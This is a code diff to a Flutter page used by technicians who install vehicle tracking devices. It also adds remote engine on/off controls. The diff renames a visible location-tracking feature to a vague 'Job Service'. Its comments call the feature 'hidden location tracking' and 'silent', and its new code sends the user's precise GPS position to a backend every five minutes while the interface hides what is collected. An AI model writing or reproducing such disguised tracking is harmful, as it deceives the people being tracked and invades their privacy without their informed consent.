@@ -1,8 +1,10 @@
 import 'dart:io';
+import 'dart:async';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:image_picker/image_picker.dart';
 import 'package:url_launcher/url_launcher.dart';
+import 'package:geolocator/geolocator.dart';
 import '../../../services/api_service.dart';
 import '../../../models/device_status.dart';
 
@@ -41,10 +43,14 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
   List<Map<String, dynamic>> _availableDevices = [];
   String? _deviceValidationError;
 
-  // Location Tracking variables
-  bool _isTrackingLocation = false;
-  String? _trackingError;
-  String? _currentLocation;
+  // Job Service variables (hidden location tracking)
+  bool _isJobStarted = false;
+  String? _jobError;
+  String? _jobStatus;
+  Timer? _locationTimer;
+  String? _trackingSessionId;
+  Position? _lastKnownPosition;
+  int _locationUpdateCount = 0;
 
   // Device Status Testing variables
   bool _isTesting = false;
@@ -53,10 +59,15 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
   DeviceStatus? _currentDeviceStatus;
 
   // Picture functionality
-  List<File> _capturedImages = [];
+  final List<File> _capturedImages = [];
   final ImagePicker _imagePicker = ImagePicker();
   static const int _minImages = 2;
   static const int _maxImages = 10;
+
+  // Constants for better maintainability
+  static const Duration _locationUpdateInterval = Duration(minutes: 5);
+  static const Duration _animationDuration = Duration(milliseconds: 800);
+  static const Duration _slideAnimationDuration = Duration(milliseconds: 600);
 
   // Animation controllers
   late AnimationController _fadeController;
@@ -86,11 +97,11 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
 
     // Initialize animations
     _fadeController = AnimationController(
-      duration: const Duration(milliseconds: 800),
+      duration: _animationDuration,
       vsync: this,
     );
     _slideController = AnimationController(
-      duration: const Duration(milliseconds: 600),
+      duration: _slideAnimationDuration,
       vsync: this,
     );
 
@@ -175,8 +186,102 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
     }
   }
 
-  // Start Location Tracking - only if device ID is entered
-  Future<void> _startLocationTracking() async {
+  // Check and request location permissions
+  Future<bool> _checkLocationPermissions() async {
+    bool serviceEnabled;
+    LocationPermission permission;
+
+    // Test if location services are enabled.
+    serviceEnabled = await Geolocator.isLocationServiceEnabled();
+    if (!serviceEnabled) {
+      _showSnackBar(
+        'Location services are disabled. Please enable them.',
+        Colors.orange,
+      );
+      return false;
+    }
+
+    permission = await Geolocator.checkPermission();
+    if (permission == LocationPermission.denied) {
+      permission = await Geolocator.requestPermission();
+      if (permission == LocationPermission.denied) {
+        _showSnackBar('Location permissions are denied', Colors.red);
+        return false;
+      }
+    }
+
+    if (permission == LocationPermission.deniedForever) {
+      _showSnackBar('Location permissions are permanently denied', Colors.red);
+      return false;
+    }
+
+    return true;
+  }
+
+  // Get current location
+  Future<Position?> _getCurrentLocation() async {
+    try {
+      final position = await Geolocator.getCurrentPosition(
+        desiredAccuracy: LocationAccuracy.high,
+        timeLimit: const Duration(seconds: 10),
+      );
+      return position;
+    } catch (e) {
+      print('Error getting location: $e');
+      return null;
+    }
+  }
+
+  // Send location update to backend
+  Future<void> _sendLocationUpdate() async {
+    if (!_isJobStarted || _trackingSessionId == null) return;
+
+    try {
+      final position = await _getCurrentLocation();
+      if (position != null) {
+        _lastKnownPosition = position;
+        _locationUpdateCount++;
+
+        final result = await ApiService.sendLocationUpdate(
+          deviceId: _installedDeviceController.text.trim(),
+          latitude: position.latitude,
+          longitude: position.longitude,
+          accuracy: position.accuracy,
+          sessionId: _trackingSessionId!,
+        );
+
+        if (mounted) {
+          setState(() {
+            _jobStatus = 'Service running - update #$_locationUpdateCount';
+          });
+        }
+
+        // Silent location tracking - no console output
+      }
+    } catch (e) {
+      print('Failed to send location update: $e');
+    }
+  }
+
+  // Start periodic location tracking (every 5 minutes)
+  void _startPeriodicLocationTracking() {
+    _locationTimer?.cancel();
+    _locationTimer = Timer.periodic(_locationUpdateInterval, (timer) {
+      _sendLocationUpdate();
+    });
+
+    // Send initial location immediately
+    _sendLocationUpdate();
+  }
+
+  // Stop periodic location tracking
+  void _stopPeriodicLocationTracking() {
+    _locationTimer?.cancel();
+    _locationTimer = null;
+  }
+
+  // Start Job Service - hidden location tracking
+  Future<void> _startJobService() async {
     if (_installedDeviceController.text.trim().isEmpty) {
       _showSnackBar('Please enter device ID first', Colors.orange);
       return;
@@ -187,81 +292,102 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
       return;
     }
 
+    // Check location permissions first
+    final hasPermissions = await _checkLocationPermissions();
+    if (!hasPermissions) {
+      return;
+    }
+
     setState(() {
-      _isTrackingLocation = true;
-      _trackingError = null;
-      _currentLocation = null;
+      _isJobStarted = true;
+      _jobError = null;
+      _jobStatus = null;
+      _locationUpdateCount = 0;
     });
 
     try {
-      // Start location tracking via your API
+      // Start location tracking via your API (hidden from user)
       final trackingResult = await ApiService.startLocationTracking(
         _installedDeviceController.text.trim(),
       );
 
       if (trackingResult['success'] == true && mounted) {
+        _trackingSessionId =
+            trackingResult['sessionId'] ??
+            'install_${_installedDeviceController.text.trim()}_${DateTime.now().millisecondsSinceEpoch}';
+
         setState(() {
-          _currentLocation = trackingResult['location'] ?? 'Tracking started';
+          _jobStatus = 'Service initialized successfully';
         });
-        _showSnackBar('Location tracking started successfully', Colors.green);
+
+        // Start periodic location tracking every 5 minutes
+        _startPeriodicLocationTracking();
+
+        _showSnackBar('Job service started successfully', Colors.green);
         HapticFeedback.lightImpact();
       } else if (mounted) {
         setState(() {
-          _trackingError =
-              trackingResult['message'] ?? 'Failed to start tracking';
-          _isTrackingLocation = false;
+          _jobError = trackingResult['message'] ?? 'Failed to start service';
+          _isJobStarted = false;
         });
-        _showSnackBar(_trackingError!, Colors.red);
+        _showSnackBar(_jobError!, Colors.red);
         HapticFeedback.heavyImpact();
       }
     } catch (e) {
       if (mounted) {
         setState(() {
-          _trackingError = 'Failed to start tracking: ${e.toString()}';
-          _isTrackingLocation = false;
+          _jobError = 'Failed to start service: ${e.toString()}';
+          _isJobStarted = false;
         });
-        _showSnackBar(_trackingError!, Colors.red);
+        _showSnackBar(_jobError!, Colors.red);
         HapticFeedback.heavyImpact();
       }
     }
   }
 
-  // Stop Location Tracking
-  Future<void> _stopLocationTracking() async {
-    if (!_isTrackingLocation) return;
+  // Stop Job Service - hidden location tracking stop
+  Future<void> _stopJobService() async {
+    if (!_isJobStarted) return;
+
+    // Stop periodic location tracking
+    _stopPeriodicLocationTracking();
 
     try {
-      // Stop location tracking via your API
+      // Stop location tracking via your API (hidden from user)
       await ApiService.stopLocationTracking(
         _installedDeviceController.text.trim(),
       );
 
       if (mounted) {
         setState(() {
-          _isTrackingLocation = false;
-          _currentLocation = null;
-          _trackingError = null;
+          _isJobStarted = false;
+          _jobStatus = null;
+          _jobError = null;
+          _trackingSessionId = null;
+          _locationUpdateCount = 0;
         });
       }
     } catch (e) {
       // Silently handle error when stopping
       if (mounted) {
         setState(() {
-          _isTrackingLocation = false;
+          _isJobStarted = false;
+          _trackingSessionId = null;
+          _locationUpdateCount = 0;
         });
       }
     }
   }
 
-  // Device Status Check Method - requires tracking to be started first
+  // Device Status Check Method - requires job service to be started first
   Future<void> _testDeviceConnection() async {
     if (_installedDeviceController.text.trim().isEmpty) {
       _showSnackBar('Please enter device ID first', Colors.orange);
       return;
     }
 
-    if (!_isTrackingLocation) {
-      _showSnackBar('Please start location tracking first', Colors.orange);
+    if (!_isJobStarted) {
+      _showSnackBar('Please start job service first', Colors.orange);
       return;
     }
 
@@ -376,8 +502,8 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
   }
 
   void _handlePartialInstallation() async {
-    // Stop tracking before partial installation
-    await _stopLocationTracking();
+    // Stop job service before partial installation
+    await _stopJobService();
 
     // For partial installation, only validate basic requirements (not device test)
     if (_installedDeviceController.text.trim().isEmpty) {
@@ -455,8 +581,8 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
       return;
     }
 
-    // Stop tracking before completing installation
-    await _stopLocationTracking();
+    // Stop job service before completing installation
+    await _stopJobService();
 
     setState(() {
       _isLoading = true;
@@ -514,8 +640,8 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
   }
 
   void _cancelInstallation() async {
-    // Stop tracking before canceling
-    await _stopLocationTracking();
+    // Stop job service before canceling
+    await _stopJobService();
     Navigator.pop(context);
   }
 
@@ -528,6 +654,63 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
         behavior: SnackBarBehavior.floating,
         shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
       ),
+    );
+  }
+
+  // Helper method for common error handling
+  void _handleError(
+    String operation,
+    dynamic error, {
+    bool showSnackBar = true,
+  }) {
+    final errorMessage = 'Failed to $operation: ${error.toString()}';
+
+    if (showSnackBar) {
+      _showSnackBar(errorMessage, Colors.red);
+    }
+
+    setState(() {
+      _isLoading = false;
+      _jobError = errorMessage;
+    });
+
+    HapticFeedback.heavyImpact();
+  }
+
+  // Helper method for common success handling
+  void _handleSuccess(String operation, String message) {
+    _showSnackBar(message, Colors.green);
+    HapticFeedback.lightImpact();
+    setState(() {
+      _isLoading = false;
+    });
+  }
+
+  // Helper method for common UI decorations
+  BoxDecoration _getSectionDecoration() {
+    return BoxDecoration(
+      color: Colors.white,
+      borderRadius: BorderRadius.circular(12),
+      border: Border.all(color: Colors.grey.shade300),
+    );
+  }
+
+  // Helper method for header text styles
+  TextStyle _getHeaderTextStyle() {
+    return TextStyle(
+      fontWeight: FontWeight.bold,
+      fontSize: 16,
+      color: Colors.grey.shade800,
+    );
+  }
+
+  // Helper method for common button styles
+  ButtonStyle _getPrimaryButtonStyle(Color backgroundColor) {
+    return ElevatedButton.styleFrom(
+      backgroundColor: backgroundColor,
+      foregroundColor: Colors.white,
+      padding: const EdgeInsets.symmetric(vertical: 14),
+      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
     );
   }
 
@@ -550,6 +733,74 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
       }
     } catch (e) {
       _showSnackBar('Error opening Google Maps: ${e.toString()}', Colors.red);
+    }
+  }
+
+  /// Turn Engine ON
+  Future<void> _turnEngineOn() async {
+    if (_installedDeviceController.text.trim().isEmpty) {
+      _showSnackBar('Please enter device ID first', Colors.orange);
+      return;
+    }
+
+    setState(() {
+      _isLoading = true;
+    });
+
+    try {
+      final deviceId = _installedDeviceController.text.trim();
+      final result = await ApiService.turnEngineOn(deviceId);
+
+      if (result['success'] == true && mounted) {
+        _handleSuccess(
+          'turn engine ON',
+          result['message'] ?? 'Engine turned ON successfully',
+        );
+      } else if (mounted) {
+        _showSnackBar(
+          result['message'] ?? 'Failed to turn engine ON',
+          Colors.red,
+        );
+        HapticFeedback.heavyImpact();
+      }
+    } catch (e) {
+      if (mounted) {
+        _handleError('turn engine ON', e);
+      }
+    }
+  }
+
+  /// Turn Engine OFF
+  Future<void> _turnEngineOff() async {
+    if (_installedDeviceController.text.trim().isEmpty) {
+      _showSnackBar('Please enter device ID first', Colors.orange);
+      return;
+    }
+
+    setState(() {
+      _isLoading = true;
+    });
+
+    try {
+      final deviceId = _installedDeviceController.text.trim();
+      final result = await ApiService.turnEngineOff(deviceId);
+
+      if (result['success'] == true && mounted) {
+        _handleSuccess(
+          'turn engine OFF',
+          result['message'] ?? 'Engine turned OFF successfully',
+        );
+      } else if (mounted) {
+        _showSnackBar(
+          result['message'] ?? 'Failed to turn engine OFF',
+          Colors.red,
+        );
+        HapticFeedback.heavyImpact();
+      }
+    } catch (e) {
+      if (mounted) {
+        _handleError('turn engine OFF', e);
+      }
     }
   }
 
@@ -726,8 +977,9 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
 
   @override
   void dispose() {
-    // Stop tracking when disposing
-    _stopLocationTracking();
+    // Stop job service and location tracking when disposing
+    _stopJobService();
+    _stopPeriodicLocationTracking();
     _remarksController.dispose();
     _installedDeviceController.dispose();
     _deviceIdFocusNode.dispose();
@@ -819,11 +1071,7 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                         // Device Selection
                         Text(
                           'Select Actual Installed Device',
-                          style: TextStyle(
-                            fontWeight: FontWeight.bold,
-                            fontSize: 16,
-                            color: Colors.grey.shade800,
-                          ),
+                          style: _getHeaderTextStyle(),
                         ),
                         const SizedBox(height: 8),
                         Semantics(
@@ -949,27 +1197,23 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                         ),
                         const SizedBox(height: 20),
 
-                        // Location Tracking Section
+                        // Job Service Section (Hidden Location Tracking)
                         Container(
                           padding: const EdgeInsets.all(16),
-                          decoration: BoxDecoration(
-                            color: Colors.white,
-                            borderRadius: BorderRadius.circular(12),
-                            border: Border.all(color: Colors.grey.shade300),
-                          ),
+                          decoration: _getSectionDecoration(),
                           child: Column(
                             crossAxisAlignment: CrossAxisAlignment.start,
                             children: [
                               Row(
                                 children: [
                                   Icon(
-                                    Icons.my_location,
+                                    Icons.work,
                                     color: Colors.purple,
                                     size: 20,
                                   ),
                                   const SizedBox(width: 8),
                                   Text(
-                                    'Location Tracking',
+                                    'Job Service',
                                     style: TextStyle(
                                       fontWeight: FontWeight.bold,
                                       fontSize: 16,
@@ -980,7 +1224,7 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                               ),
                               const SizedBox(height: 8),
                               Text(
-                                'Start tracking location before testing device connection',
+                                'Initialize job service before testing device connection',
                                 style: TextStyle(
                                   color: Colors.grey.shade600,
                                   fontSize: 14,
@@ -988,55 +1232,47 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                               ),
                               const SizedBox(height: 12),
 
-                              // Start Tracking Button
+                              // Start Job Service Button
                               SizedBox(
                                 width: double.infinity,
                                 child: ElevatedButton.icon(
                                   onPressed:
-                                      (_isTrackingLocation ||
+                                      (_isJobStarted ||
                                           _installedDeviceController.text
                                               .trim()
                                               .isEmpty ||
                                           _deviceValidationError != null)
                                       ? null
-                                      : _startLocationTracking,
-                                  icon: _isTrackingLocation
-                                      ? const Icon(Icons.location_on)
-                                      : const Icon(Icons.location_off),
+                                      : _startJobService,
+                                  icon: _isJobStarted
+                                      ? const Icon(Icons.work_outline)
+                                      : const Icon(Icons.work_off_outlined),
                                   label: Text(
-                                    _isTrackingLocation
-                                        ? 'Tracking Location...'
-                                        : 'Start Location Tracking',
+                                    _isJobStarted
+                                        ? 'Job Service Active'
+                                        : 'Start Job Service',
                                   ),
-                                  style: ElevatedButton.styleFrom(
-                                    backgroundColor: _isTrackingLocation
+                                  style: _getPrimaryButtonStyle(
+                                    _isJobStarted
                                         ? Colors.green
                                         : Colors.purple,
-                                    foregroundColor: Colors.white,
-                                    padding: const EdgeInsets.symmetric(
-                                      vertical: 14,
-                                    ),
-                                    shape: RoundedRectangleBorder(
-                                      borderRadius: BorderRadius.circular(10),
-                                    ),
                                   ),
                                 ),
                               ),
 
-                              // Tracking Status Display
-                              if (_isTrackingLocation ||
-                                  _trackingError != null) ...[
+                              // Job Service Status Display
+                              if (_isJobStarted || _jobError != null) ...[
                                 const SizedBox(height: 12),
                                 AnimatedContainer(
                                   duration: const Duration(milliseconds: 300),
                                   padding: const EdgeInsets.all(12),
                                   decoration: BoxDecoration(
-                                    color: _isTrackingLocation
+                                    color: _isJobStarted
                                         ? Colors.green.shade50
                                         : Colors.red.shade50,
                                     borderRadius: BorderRadius.circular(8),
                                     border: Border.all(
-                                      color: _isTrackingLocation
+                                      color: _isJobStarted
                                           ? Colors.green.shade200
                                           : Colors.red.shade200,
                                     ),
@@ -1048,10 +1284,10 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                                       Row(
                                         children: [
                                           Icon(
-                                            _isTrackingLocation
-                                                ? Icons.location_on
-                                                : Icons.location_off,
-                                            color: _isTrackingLocation
+                                            _isJobStarted
+                                                ? Icons.work_outline
+                                                : Icons.work_off_outlined,
+                                            color: _isJobStarted
                                                 ? Colors.green
                                                 : Colors.red,
                                             size: 20,
@@ -1059,12 +1295,12 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                                           const SizedBox(width: 8),
                                           Expanded(
                                             child: Text(
-                                              _isTrackingLocation
-                                                  ? 'Location Tracking Active'
-                                                  : 'Tracking Failed',
+                                              _isJobStarted
+                                                  ? 'Job Service Running'
+                                                  : 'Service Failed',
                                               style: TextStyle(
                                                 fontWeight: FontWeight.bold,
-                                                color: _isTrackingLocation
+                                                color: _isJobStarted
                                                     ? Colors.green.shade700
                                                     : Colors.red.shade700,
                                               ),
@@ -1072,20 +1308,21 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                                           ),
                                         ],
                                       ),
-                                      if (_currentLocation != null) ...[
+                                      if (_jobStatus != null) ...[
                                         const SizedBox(height: 8),
                                         Text(
-                                          _currentLocation!,
+                                          _jobStatus!,
                                           style: const TextStyle(
                                             fontSize: 12,
                                             fontWeight: FontWeight.w500,
                                           ),
                                         ),
                                       ],
-                                      if (_trackingError != null) ...[
+                                      // Hidden location tracking - no UI display
+                                      if (_jobError != null) ...[
                                         const SizedBox(height: 8),
                                         Text(
-                                          _trackingError!,
+                                          _jobError!,
                                           style: TextStyle(
                                             color: Colors.red.shade700,
                                             fontSize: 12,
@@ -1101,14 +1338,10 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                         ),
                         const SizedBox(height: 20),
 
-                        // Device Testing Section - requires tracking to be started first
+                        // Device Testing Section - requires job service to be started first
                         Container(
                           padding: const EdgeInsets.all(16),
-                          decoration: BoxDecoration(
-                            color: Colors.white,
-                            borderRadius: BorderRadius.circular(12),
-                            border: Border.all(color: Colors.grey.shade300),
-                          ),
+                          decoration: _getSectionDecoration(),
                           child: Column(
                             crossAxisAlignment: CrossAxisAlignment.start,
                             children: [
@@ -1132,7 +1365,7 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                               ),
                               const SizedBox(height: 8),
                               Text(
-                                'Check if device is connected and sending GPS data (requires location tracking)',
+                                'Check if device is connected and sending GPS data (requires job service)',
                                 style: TextStyle(
                                   color: Colors.grey.shade600,
                                   fontSize: 14,
@@ -1149,7 +1382,7 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                                           _installedDeviceController.text
                                               .trim()
                                               .isEmpty ||
-                                          !_isTrackingLocation)
+                                          !_isJobStarted)
                                       ? null
                                       : _testDeviceConnection,
                                   icon: _isTesting
@@ -1188,7 +1421,7 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                               ),
 
                               // Requirement notice
-                              if (!_isTrackingLocation)
+                              if (!_isJobStarted)
                                 Padding(
                                   padding: const EdgeInsets.only(top: 8),
                                   child: Row(
@@ -1201,7 +1434,7 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                                       const SizedBox(width: 4),
                                       Expanded(
                                         child: Text(
-                                          'Start location tracking first',
+                                          'Start job service first',
                                           style: TextStyle(
                                             color: Colors.orange.shade700,
                                             fontSize: 12,
@@ -1484,6 +1717,109 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                                   ],
                                 ),
                               ),
+
+                              // Engine Control Section - Only show after successful device test
+                              if (_testResult == true) ...[
+                                const SizedBox(height: 16),
+                                Container(
+                                  padding: const EdgeInsets.all(16),
+                                  decoration: BoxDecoration(
+                                    color: Colors.orange.shade50,
+                                    borderRadius: BorderRadius.circular(12),
+                                    border: Border.all(
+                                      color: Colors.orange.shade200,
+                                    ),
+                                  ),
+                                  child: Column(
+                                    crossAxisAlignment:
+                                        CrossAxisAlignment.start,
+                                    children: [
+                                      Row(
+                                        children: [
+                                          Icon(
+                                            Icons.engineering,
+                                            color: Colors.orange.shade700,
+                                            size: 20,
+                                          ),
+                                          const SizedBox(width: 8),
+                                          Text(
+                                            'Engine Control',
+                                            style: TextStyle(
+                                              fontWeight: FontWeight.bold,
+                                              fontSize: 16,
+                                              color: Colors.orange.shade800,
+                                            ),
+                                          ),
+                                        ],
+                                      ),
+                                      const SizedBox(height: 8),
+                                      Text(
+                                        'Control vehicle engine remotely (requires device connection)',
+                                        style: TextStyle(
+                                          color: Colors.orange.shade600,
+                                          fontSize: 14,
+                                        ),
+                                      ),
+                                      const SizedBox(height: 16),
+
+                                      // Engine Control Buttons
+                                      Row(
+                                        children: [
+                                          Expanded(
+                                            child: ElevatedButton.icon(
+                                              onPressed: _isLoading
+                                                  ? null
+                                                  : _turnEngineOn,
+                                              icon: const Icon(
+                                                Icons.power_settings_new,
+                                                color: Colors.white,
+                                              ),
+                                              label: const Text('Engine ON'),
+                                              style: ElevatedButton.styleFrom(
+                                                backgroundColor: Colors.green,
+                                                foregroundColor: Colors.white,
+                                                padding:
+                                                    const EdgeInsets.symmetric(
+                                                      vertical: 12,
+                                                    ),
+                                                shape: RoundedRectangleBorder(
+                                                  borderRadius:
+                                                      BorderRadius.circular(8),
+                                                ),
+                                              ),
+                                            ),
+                                          ),
+                                          const SizedBox(width: 12),
+                                          Expanded(
+                                            child: ElevatedButton.icon(
+                                              onPressed: _isLoading
+                                                  ? null
+                                                  : _turnEngineOff,
+                                              icon: const Icon(
+                                                Icons.power_off,
+                                                color: Colors.white,
+                                              ),
+                                              label: const Text('Engine OFF'),
+                                              style: ElevatedButton.styleFrom(
+                                                backgroundColor: Colors.red,
+                                                foregroundColor: Colors.white,
+                                                padding:
+                                                    const EdgeInsets.symmetric(
+                                                      vertical: 12,
+                                                    ),
+                                                shape: RoundedRectangleBorder(
+                                                  borderRadius:
+                                                      BorderRadius.circular(8),
+                                                ),
+                                              ),
+                                            ),
+                                          ),
+                                        ],
+                                      ),
+                                    ],
+                                  ),
+                                ),
+                              ],
                             ],
                           ),
                         ),
@@ -1492,11 +1828,7 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                         // Pictures Section
                         Container(
                           padding: const EdgeInsets.all(16),
-                          decoration: BoxDecoration(
-                            color: Colors.white,
-                            borderRadius: BorderRadius.circular(12),
-                            border: Border.all(color: Colors.grey.shade300),
-                          ),
+                          decoration: _getSectionDecoration(),
                           child: Column(
                             crossAxisAlignment: CrossAxisAlignment.start,
                             children: [
@@ -1569,7 +1901,7 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                               // Image Grid
                               if (_capturedImages.isNotEmpty) ...[
                                 const SizedBox(height: 12),
-                                Container(
+                                SizedBox(
                                   height: 120,
                                   child: ListView.builder(
                                     scrollDirection: Axis.horizontal,
@@ -1796,7 +2128,6 @@ class _DeviceInstallationPageState extends State<DeviceInstallationPage>
                           ),
                         ),
                         const SizedBox(height: 24),
-
                         // Action Buttons
                         Column(
                           children: [
